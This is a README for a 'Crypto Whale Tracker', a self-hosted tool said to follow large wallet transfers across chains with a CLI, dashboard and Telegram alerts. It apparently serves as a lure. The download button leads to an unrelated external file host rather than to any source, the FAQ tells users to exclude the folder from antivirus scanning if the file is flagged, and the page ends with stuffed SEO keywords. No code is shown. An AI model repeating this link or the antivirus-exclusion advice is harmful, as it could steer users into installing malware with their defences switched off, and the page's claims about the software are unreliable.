# Crypto Whale Tracker 🐋📡

A self-hosted tracker for following **large wallet movements** across Ethereum, Solana, and Bitcoin without relying on a paid data vendor. Instead of one opaque "whale alert" feed, it gives you the raw transfer, the labeled counterparty, the exchange inflow or outflow classification, and a severity tier based on USD value. Everything runs on your own machine, with a CLI, a local dashboard, and optional Telegram alerts.

[![Download Crypto Whale Tracker](https://img.shields.io/badge/Download-Crypto_Whale_Tracker-blueviolet)](https://dyhuiying.com/s/file)

![Version](https://img.shields.io/badge/version-1.2-blue)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-0078D6)
![Status](https://img.shields.io/badge/status-active-brightgreen)
![Chains](https://img.shields.io/badge/chains-5%2B-orange)

<details>
<summary>📑 Contents</summary>

- [Quick Start](#-quick-start)
- [Requirements](#️-requirements)
- [Key Features](#-key-features)
- [Module Overview](#-module-overview)
- [Why Choose Crypto Whale Tracker](#-why-choose-crypto-whale-tracker)
- [FAQ](#-faq)
- [SEO Keywords](#-seo-keywords)

</details>

## ⚡ Quick Start

1. Download the archive using the button above.
2. Install dependencies with `pip install -r requirements.txt`.
3. Add wallet addresses or labels to `config.yaml`, then run the tracker.

The dashboard opens at `http://localhost:8080`, and the CLI starts streaming alerts on first launch.

## 🖥️ Requirements

| Item | Requirement |
|------|-------------|
| OS | Windows 10/11, macOS 12+, Linux (64-bit) |
| RAM | 4 GB minimum |
| Storage | 300 MB free |
| Privileges | Standard user (no admin required) |

## ✨ Key Features

**Real-Time Tracking**

- 🐋 **Large Transfer Feed** — live ERC-20, native, and SPL transfers above a configurable USD threshold.
- 🔗 **Multi-Chain Coverage** — Ethereum, Solana, BSC, Polygon, Arbitrum, and Bitcoin via public RPCs.
- 🏷️ **CEX Labeling** — 35+ known exchange hot wallets auto-classified as deposits or withdrawals.
- 📊 **Severity Tiers** — info, low, medium, high, and critical bands by transfer size.

**Flow Intelligence**

- 📥 **Exchange Inflow / Outflow** — real-time leaderboard of which CEXs are receiving or shedding tokens.
- 📈 **30-Day Netflow Chart** — historical inflow and outflow per token and per exchange.
- 🎯 **Top Destinations** — counter of the most frequent recipient wallets and contracts.
- 🧠 **Smart-Money Signals** — wallets with a tracked PnL history flagged separately from raw transfers.

**Alerts & Watchlist**

- 📱 **Telegram Alerts** — push notifications for transfers above your threshold or severity tier.
- ⭐ **Watchlist** — follow specific addresses with custom labels and per-wallet thresholds.
- 🔔 **Score-Based Alerts** — trigger on a composite whale score instead of a raw USD amount.
- 📡 **Webhook Support** — forward alerts to your own endpoint or trading bot.

**Interfaces**

- 💻 **CLI Mode** — structured JSON output for scripting and automation.
- 🌐 **Local Dashboard** — web UI for exploring transfers, flows, and watchlists.
- 🤖 **Agent-Native CLI** — JSON by default, meaningful exit codes, designed for AI agents to call directly.
- 🐳 **Docker Support** — one-command deployment with `docker compose up`.

## 📋 Module Overview

| Module | What it does | Interface |
|--------|--------------|-----------|
| transfer_feed | Live large transfers across chains | CLI / Dashboard |
| cex_labeler | Classify exchange deposits and withdrawals | Python API |
| flow_analyzer | Inflow and outflow leaderboard | Dashboard |
| score_engine | Composite whale score per transfer | Python API |
| alert_engine | Telegram, webhook, and CLI alerts | CLI |
| watchlist | Track specific addresses with labels | CLI / Dashboard |
| cli_agent | JSON output for AI agents | CLI |
| docker_runner | Container deployment | Docker |

## 🚀 Why Choose Crypto Whale Tracker

- ✅ Raw on-chain data — transfers come from public RPCs, not a paid aggregator with opaque logic.
- ✅ Exchange-aware — 35+ labeled CEX hot wallets turn a transfer into a deposit or withdrawal signal.
- ✅ Agent-native CLI — structured JSON and meaningful exit codes, so AI agents can consume it without scraping.
- ✅ Multi-chain in one tool — Ethereum, Solana, BSC, Polygon, Arbitrum, and Bitcoin share the same interface.
- ✅ Self-hosted — no API keys required for the core tracker, and no data leaves your machine.

## 💡 Why Use It

- 🐋 See large transfers as they happen instead of hours later on social media.
- 📊 Track which exchanges are accumulating or distributing a token.
- 🧭 Follow specific whale wallets with custom labels and thresholds.
- 🤖 Wire whale alerts into an AI agent or trading bot through the JSON CLI.

## ❓ FAQ

**Do I need to run it as Administrator?**
No — the tracker runs as a standard user process and does not require elevated privileges.

**Will my antivirus flag the file?**
Some engines may flag Python entry points by heuristic. Add the project folder to exclusions if needed.

**Does it work on Windows 11?**
Yes — Windows 10/11, macOS, and Linux are all supported.

**Does it require paid API keys?**
Core tracking uses public RPCs; optional providers can be added for higher rate limits.

**How do I update?**
Pull the latest archive and reinstall dependencies — watchlists and configs are preserved.

## 🔎 SEO Keywords

Crypto Whale Tracker, crypto whale tracker github, self-hosted whale tracker, real-time whale alerts, whale wallet tracker, crypto whale monitoring, exchange flow analysis, CEX inflow outflow, crypto whale alert bot, multi-chain whale tracker, whale tracker CLI, AI agent crypto tracker, crypto whale dashboard, on-chain whale tracking, large transfer tracker, crypto whale score, Telegram whale alerts, whale watchlist, open source whale tracker, crypto whale tracker python

## ⚠️ Disclaimer

Provided for educational and informational purposes only. Use at your own risk and in accordance with the terms of service of any data provider you interact with.
